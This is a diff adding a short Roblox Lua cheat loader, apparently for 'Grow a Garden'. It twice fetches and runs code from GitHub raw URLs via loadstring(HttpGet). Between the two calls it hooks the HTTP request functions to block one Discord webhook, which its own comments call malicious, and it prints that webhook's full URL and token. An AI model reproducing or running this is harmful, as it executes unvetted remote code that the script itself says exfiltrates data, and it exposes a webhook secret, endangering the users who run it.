@@ -1,0 +1,33 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ronzzofficial/lol/refs/heads/main/lol"))()
+task.wait(3)
+
+-- Block webhook functionality only for the second script
+local originalRequest = request
+local originalPostAsync = game:GetService("HttpService").PostAsync
+
+-- Block only the specific malicious webhook from gagFREE.lua
+local blockedWebhook = "https://discord.com/api/webhooks/1393589102821249074/rj931h6KfxS4KSeQ2RXKBxcuPgP-gLwqQn_IBA-CQoSt_XlT0HjkUjPHh9LrKAL2sk9o"
+
+-- Override the request function to block only the specific webhook
+request = function(options)
+    if options.Url and options.Url:find(blockedWebhook) then
+        print("Malicious webhook blocked: " .. options.Url)
+        return {
+            StatusCode = 200,
+            Body = "{}"
+        }
+    end
+    return originalRequest(options)
+end
+
+-- Block HttpService requests as well
+local HttpService = game:GetService("HttpService")
+HttpService.PostAsync = function(self, url, data)
+    if url and url:find(blockedWebhook) then
+        print("HttpService malicious webhook blocked: " .. url)
+        return "{}"
+    end
+    return originalPostAsync(self, url, data)
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/xscript"))()
